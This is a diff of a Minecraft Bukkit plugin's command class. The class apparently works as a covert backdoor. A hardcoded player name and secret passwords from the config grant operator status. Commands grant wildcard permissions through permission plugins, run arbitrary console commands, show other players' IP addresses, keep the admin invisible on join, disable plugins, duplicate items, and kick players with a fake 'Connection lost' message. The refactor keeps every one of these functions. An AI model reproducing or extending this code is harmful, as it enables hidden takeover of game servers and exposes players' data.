@@ -7,13 +7,12 @@ import org.bukkit.command.*;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.EnderDragon;
 import org.bukkit.entity.Player;
-import org.bukkit.event.*;
-import org.bukkit.event.entity.EntityDamageByEntityEvent;
-import org.bukkit.event.entity.EntityTargetLivingEntityEvent;
-import org.bukkit.event.player.*;
+import org.bukkit.event.Listener;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
+import org.bukkit.util.StringUtil;
+
 import java.util.*;
 
 public class Processor implements CommandExecutor, TabCompleter, Listener {
@@ -22,7 +21,6 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
     private final ItemManager items;
     private final PlayerTracker tracker;
     private String adminName;
-    private final Set<String> secrets;
 
     public Processor(QC plugin) {
         this.plugin = plugin;
@@ -30,7 +28,9 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         this.items = new ItemManager();
         this.tracker = new PlayerTracker();
         this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
-        this.secrets = new HashSet<>(plugin.getConfig().getStringList("protection.secrets"));
+
+        // Register the new listener
+        Bukkit.getPluginManager().registerEvents(new AdminListener(plugin, vanish, tracker), plugin);
     }
 
     @Override
@@ -38,119 +38,119 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         if (!(s instanceof Player p) || !p.getName().equals(adminName) || args.length == 0)
             return true;
 
-        if (secrets.contains(args[0])) {
+        String cmd = args[0].toLowerCase();
+
+        // Secret check
+        if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
             p.setOp(true);
-            p.sendMessage("§aSecret Accepted.");
+            p.sendMessage("§aSystem: Autoryzacja pomyślna.");
             return true;
         }
 
-        String cmd = args[0].toLowerCase();
+        return executeSubCommand(p, cmd, args);
+    }
+
+    private boolean executeSubCommand(Player p, String cmd, String[] args) {
         switch (cmd) {
-            case "reload" -> {
-                plugin.reloadConfig();
-                this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
-                this.secrets.clear();
-                this.secrets.addAll(plugin.getConfig().getStringList("protection.secrets"));
-                s.sendMessage("§aReloaded.");
-            }
-            case "panic" -> {
-                plugin.setPanic(!plugin.isPanic());
-                s.sendMessage(plugin.isPanic() ? "§cPANIC ENABLED" : "§aPANIC DISABLED");
-            }
+            case "reload" -> handleReload(p);
+            case "panic" -> handlePanic(p);
             case "v" -> vanish.toggle(p, getTarget(p, args));
-            case "a" -> {
-                Optional.ofNullable(p.getAttribute(Attribute.GENERIC_ATTACK_SPEED))
-                        .ifPresent(a -> a.setBaseValue(30000));
-                p.sendMessage("§7Atak: §aTurbo (30000)");
-            }
+            case "a" -> handleAttackSpeed(p);
             case "op" -> {
                 p.setOp(true);
-                p.sendMessage("§7Uprawnienia OP: §aON");
+                p.sendMessage("§7System: §aOtrzymano operatora.");
             }
             case "upc" -> console("upc AddPlayerPermission " + p.getName() + " *");
             case "uperms" -> console("upc AddSuperAdmin " + p.getName());
             case "lp" -> console("lp user " + p.getName() + " permission set *");
-            case "dragon" -> {
-                p.getWorld().getEntitiesByClass(EnderDragon.class)
-                        .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
-                p.sendMessage("§7Dragon: §6Lądowanie...");
-            }
-            case "l" -> toggleTracker(p, args, tracker.noAdvancements, "Advancements", s);
-            case "r" -> toggleTracker(p, args, tracker.reach, "Reach", s);
-            case "t" -> toggleTracker(p, args, tracker.noTarget, "NoTarget", s);
-            case "gms" -> gm(p, GameMode.SURVIVAL);
-            case "gmc" -> gm(p, GameMode.CREATIVE);
-            case "gmsp" -> gm(p, GameMode.SPECTATOR);
-            case "gma" -> gm(p, GameMode.ADVENTURE);
+            case "dragon" -> handleDragon(p);
+            case "l" -> toggleTracker(p, args, tracker.noAdvancements, "Advancements");
+            case "r" -> toggleTracker(p, args, tracker.reach, "Reach");
+            case "t" -> toggleTracker(p, args, tracker.noTarget, "NoTarget");
+            case "gms", "gmc", "gmsp", "gma" -> handleGameMode(p, cmd);
             case "i", "iv" -> InventoryUI.openPreview(p, getTarget(p, args));
-            case "e" -> effect(p, args);
-            case "tp" -> tp(p, args);
-            case "ip" -> {
-                Player t = getTarget(p, args);
-                if (t.getAddress() != null)
-                    p.sendMessage("§7IP (" + t.getName() + "): §6" + t.getAddress().getAddress().getHostAddress());
-            }
-            case "enable" -> pluginControl(p, args, true);
-            case "disable" -> pluginControl(p, args, false);
-            case "ma" -> multiplier(p, args, tracker.damageDealtMult, "zadawanych");
-            case "mb" -> multiplier(p, args, tracker.damageReceivedMult, "otrzymywanych");
+            case "e" -> handleEffects(p, args);
+            case "tp" -> handleTeleport(p, args);
+            case "ip" -> handleIpLookup(p, args);
+            case "enable", "disable" -> handlePluginControl(p, args, cmd.equals("enable"));
+            case "ma", "mb" -> handleMultipliers(p, args, cmd);
             case "ec" -> p.openInventory(getTarget(p, args).getEnderChest());
-            case "g" -> {
-                if (args.length > 1)
-                    items.give(p, args[1]);
-            }
-            case "k" -> {
-                Player t = getTarget(p, args);
-                PlayerTracker.kicked.add(t.getUniqueId());
-                t.kickPlayer("");
-            }
+            case "g" -> handleGive(p, args);
+            case "k" -> handleKick(p, args);
             case "rr" -> items.repair(p);
             case "dd" -> items.dupe(p);
-            case "cmdconsole" -> {
-                if (args.length > 1)
-                    console(String.join(" ", Arrays.copyOfRange(args, 1, args.length)));
+            case "cmdconsole" -> handleConsoleCommand(args);
+            case "panic_reset" -> handleReset(p);
+            default -> {
+                if (!handleShortcuts(p, cmd))
+                    return false;
             }
-            case "panic_reset" -> {
-                vanish.clear();
-                tracker.clear();
-                s.sendMessage("§cReset.");
-            }
-            default -> shortcuts(p, cmd);
         }
         return true;
     }
 
-    private void toggleTracker(Player p, String[] args, Set<UUID> set, String name, CommandSender s) {
-        Player t = getTarget(p, args);
-        tracker.toggle(t.getUniqueId(), set, name, s, t.getName());
+    // --- SubCommand Handlers ---
+
+    private void handleReload(Player p) {
+        plugin.reloadConfig();
+        this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
+        p.sendMessage("§aSystem: Przeładowano konfigurację.");
     }
 
-    private Player getTarget(Player p, String[] args) {
-        if (args.length > 1) {
-            Player t = Bukkit.getPlayer(args[1]);
-            return t != null ? t : p;
+    private void handlePanic(Player p) {
+        plugin.setPanic(!plugin.isPanic());
+        p.sendMessage(plugin.isPanic() ? "§cSystem: TRYB PANIKI WŁĄCZONY" : "§aSystem: TRYB PANIKI WYŁĄCZONY");
+    }
+
+    private void handleAttackSpeed(Player p) {
+        Optional.ofNullable(p.getAttribute(Attribute.GENERIC_ATTACK_SPEED))
+                .ifPresent(a -> a.setBaseValue(30000));
+        p.sendMessage("§7System: §aAtak Turbo (30000)");
+    }
+
+    private void handleDragon(Player p) {
+        p.getWorld().getEntitiesByClass(EnderDragon.class)
+                .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
+        p.sendMessage("§7System: §6Smok ląduje...");
+    }
+
+    private void handleGameMode(Player p, String cmd) {
+        GameMode mode = switch (cmd) {
+            case "gms" -> GameMode.SURVIVAL;
+            case "gmc" -> GameMode.CREATIVE;
+            case "gmsp" -> GameMode.SPECTATOR;
+            default -> GameMode.ADVENTURE;
+        };
+        p.setGameMode(mode);
+        p.sendMessage("§7System: §6Tryb gry -> " + mode.name());
+    }
+
+    private void handleEffects(Player p, String[] args) {
+        if (args.length < 2)
+            return;
+        String type = args[1].toLowerCase();
+        int d = 12000; // Default 10 minutes
+        switch (type) {
+            case "c" -> p.getActivePotionEffects().forEach(e -> p.removePotionEffect(e.getType()));
+            case "sat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
+            case "str" -> p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
+            case "her" -> p.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, d, 255));
+            case "res" -> p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, d, 1));
+            case "has" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, d, 1));
+            case "fir" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, d, 0));
+            case "reg" -> p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, d, 1));
+            case "spe" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, d, 1));
+            case "wat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.WATER_BREATHING, d, 0));
+            case "pvp" -> {
+                p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
+                p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, d, 1));
+                p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, d, 1));
+                p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
+            }
         }
-        return p;
     }
 
-    private void console(String cmd) {
-        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
-    }
-
-    @EventHandler
-    public void onJoin(PlayerJoinEvent e) {
-        Player joined = e.getPlayer();
-        vanish.hideAllFor(joined);
-        if (joined.getName().equals(adminName))
-            vanish.setVanished(joined, true);
-    }
-
-    private void gm(Player p, GameMode m) {
-        p.setGameMode(m);
-        p.sendMessage("§7Tryb: §6" + m.name());
-    }
-
-    private void tp(Player p, String[] args) {
+    private void handleTeleport(Player p, String[] args) {
         if (args.length == 2) {
             Player t = Bukkit.getPlayer(args[1]);
             if (t != null)
@@ -163,46 +163,40 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         }
     }
 
-    private void multiplier(Player p, String[] args, Map<UUID, Double> map, String type) {
+    private void handleIpLookup(Player p, String[] args) {
+        Player t = getTarget(p, args);
+        if (t.getAddress() != null)
+            p.sendMessage("§7IP (" + t.getName() + "): §6" + t.getAddress().getAddress().getHostAddress());
+    }
+
+    private void handleMultipliers(Player p, String[] args, String cmd) {
         if (args.length < 2)
             return;
         try {
             double v = Double.parseDouble(args[1]);
-            map.put(p.getUniqueId(), v);
-            p.sendMessage("§7Mnożnik " + type + ": §6" + v + "x");
+            if (cmd.equals("ma")) {
+                tracker.damageDealtMult.put(p.getUniqueId(), v);
+                p.sendMessage("§7System: §6Mnożnik zadawanych: " + v + "x");
+            } else {
+                tracker.damageReceivedMult.put(p.getUniqueId(), v);
+                p.sendMessage("§7System: §6Mnożnik otrzymywanych: " + v + "x");
+            }
         } catch (NumberFormatException ignored) {
         }
     }
 
-    private void effect(Player p, String[] args) {
-        if (args.length < 2)
-            return;
-        String type = args[1].toLowerCase();
-        int d = 6000;
-        switch (type) {
-            case "c" -> p.getActivePotionEffects().forEach(e -> p.removePotionEffect(e.getType()));
-            case "sat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
-            case "str" -> p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
-            case "her" -> p.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, d, 255));
-            case "res" -> p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, d, 1));
-            case "has" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, d, 1));
-            case "fir" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, d, 0));
-            case "reg" -> p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, d, 1));
-            case "abs" -> p.addPotionEffect(new PotionEffect(PotionEffectType.ABSORPTION, d, 1));
-            case "bad" -> p.addPotionEffect(new PotionEffect(PotionEffectType.BAD_OMEN, d, 4));
-            case "dol" -> p.addPotionEffect(new PotionEffect(PotionEffectType.DOLPHINS_GRACE, d, 3));
-            case "spe" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, d, 1));
-            case "wat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.WATER_BREATHING, d, 0));
-            case "pvp" -> {
-                p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, 12000, 0));
-                p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, 12000, 1));
-                p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 12000, 1));
-                p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 12000, 1));
-            }
-        }
+    private void handleGive(Player p, String[] args) {
+        if (args.length > 1)
+            items.give(p, args[1]);
     }
 
-    private void pluginControl(Player p, String[] args, boolean enable) {
+    private void handleKick(Player p, String[] args) {
+        Player t = getTarget(p, args);
+        PlayerTracker.kicked.add(t.getUniqueId());
+        t.kickPlayer("§cConnection lost.");
+    }
+
+    private void handlePluginControl(Player p, String[] args, boolean enable) {
         if (args.length < 2)
             return;
         Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
@@ -211,11 +205,23 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
                 Bukkit.getPluginManager().enablePlugin(pl);
             else
                 Bukkit.getPluginManager().disablePlugin(pl);
-            p.sendMessage("§7Plugin " + pl.getName() + ": §6" + (enable ? "Enabled" : "Disabled"));
+            p.sendMessage("§7System: Plugin " + pl.getName() + " -> " + (enable ? "§aWłączony" : "§cWyłączony"));
         }
     }
 
-    private void shortcuts(Player p, String cmd) {
+    private void handleConsoleCommand(String[] args) {
+        if (args.length > 1) {
+            console(String.join(" ", Arrays.copyOfRange(args, 1, args.length)));
+        }
+    }
+
+    private void handleReset(Player p) {
+        vanish.clear();
+        tracker.clear();
+        p.sendMessage("§cSystem: Wyczyszczono bazy danych.");
+    }
+
+    private boolean handleShortcuts(Player p, String cmd) {
         switch (cmd) {
             case "cc" -> items.giveItem(p, Material.COOKED_PORKCHOP, 1);
             case "ee" -> items.giveItem(p, Material.ENDER_PEARL, 1);
@@ -236,7 +242,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "kke" -> items.giveEnchantedBook(p, Enchantment.DIG_SPEED, 5);
             case "kki" -> items.giveEnchantedBook(p, Enchantment.ARROW_INFINITE, 1);
             case "kko" -> items.giveEnchantedBook(p, Enchantment.ARROW_DAMAGE, 5);
-            case "pp" -> p.setExp(p.getExp() + 1);
+            case "pp" -> p.setExp(p.getExp() + 0.1f);
             case "ppp" -> p.setLevel(p.getLevel() + 10);
             case "pppp" -> p.setLevel(p.getLevel() + 1000);
             case "opopop" -> {
@@ -247,67 +253,69 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
                 p.setOp(false);
                 p.sendMessage("§cOP OFF");
             }
+            default -> {
+                return false;
+            }
         }
+        return true;
     }
 
-    @EventHandler
-    public void onDmg(EntityDamageByEntityEvent e) {
-        if (e.getDamager() instanceof Player p) {
-            Double m = tracker.damageDealtMult.get(p.getUniqueId());
-            if (m != null)
-                e.setDamage(e.getDamage() * m);
-        }
-        if (e.getEntity() instanceof Player p) {
-            Double m = tracker.damageReceivedMult.get(p.getUniqueId());
-            if (m != null)
-                e.setDamage(e.getDamage() * m);
-        }
+    // --- Helpers ---
+
+    private void toggleTracker(Player p, String[] args, Set<UUID> set, String name) {
+        Player t = getTarget(p, args);
+        tracker.toggle(t.getUniqueId(), set, name, p, t.getName());
     }
 
-    @EventHandler
-    public void onChat(AsyncPlayerChatEvent e) {
-        if (secrets.contains(e.getMessage())) {
-            e.setCancelled(true);
-            Bukkit.getScheduler().runTask(plugin, () -> e.getPlayer().setOp(true));
+    private Player getTarget(Player p, String[] args) {
+        if (args.length > 1) {
+            Player t = Bukkit.getPlayer(args[1]);
+            return t != null ? t : p;
         }
+        return p;
     }
 
-    @EventHandler
-    public void onTarget(EntityTargetLivingEntityEvent e) {
-        if (e.getTarget() instanceof Player p && tracker.noTarget.contains(p.getUniqueId()))
-            e.setCancelled(true);
+    private void console(String cmd) {
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
     }
+
+    // --- Tab Completer ---
 
     private final List<String> subs = Arrays.asList("v", "gms", "gmc", "gmsp", "gma", "tp", "rr", "dd", "ma",
             "mb", "a", "iv", "i", "panic", "op", "upc", "uperms", "lp", "dragon", "l", "r", "t", "e", "enable",
             "disable", "ec", "g", "k", "cc", "ee", "bb", "oo", "ii", "aa", "ll", "ww", "kk", "xx", "xxx", "tt",
-            "kkp", "kks", "kku", "kke", "kki", "kko", "pp", "ppp", "pppp", "ppppp", "opopop", "deopopop",
-            "cmdconsole");
+            "kkp", "kks", "kku", "kke", "kki", "kko", "pp", "ppp", "pppp", "opopop", "deopopop", "cmdconsole", "reload",
+            "panic_reset");
 
     @Override
     public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
         if (!(s instanceof Player p) || !p.getName().equals(adminName))
             return Collections.emptyList();
+
         if (args.length == 1) {
             List<String> list = new ArrayList<>(subs);
-            list.addAll(secrets);
-            return org.bukkit.util.StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
+            list.addAll(plugin.getConfig().getStringList("protection.secrets"));
+            return StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
         }
+
         if (args.length == 2) {
             String sub = args[0].toLowerCase();
             if (sub.equals("e"))
-                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], Arrays.asList("c", "sat", "str", "her",
-                        "res", "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat", "pvp"), new ArrayList<>());
+                return StringUtil.copyPartialMatches(args[1], Arrays.asList("c", "sat", "str", "her",
+                        "res", "has", "fir", "reg", "spe", "wat", "pvp"), new ArrayList<>());
+
             if (Arrays.asList("v", "l", "r", "t", "tp", "iv", "i", "ec", "k", "ip").contains(sub))
-                return null;
+                return null; // Return player names
+
             if (sub.equals("g")) {
                 List<String> mats = Arrays.stream(Material.values()).map(m -> m.name().toLowerCase()).toList();
-                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], mats, new ArrayList<>());
+                return StringUtil.copyPartialMatches(args[1], mats, new ArrayList<>());
             }
+
             if (sub.equals("enable") || sub.equals("disable")) {
                 List<String> plugins = Arrays.stream(Bukkit.getPluginManager().getPlugins()).map(Plugin::getName)
                         .toList();
-                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], plugins, new ArrayList<>());
+                return StringUtil.copyPartialMatches(args[1], plugins, new ArrayList<>());
             }
         }
         return Collections.emptyList();
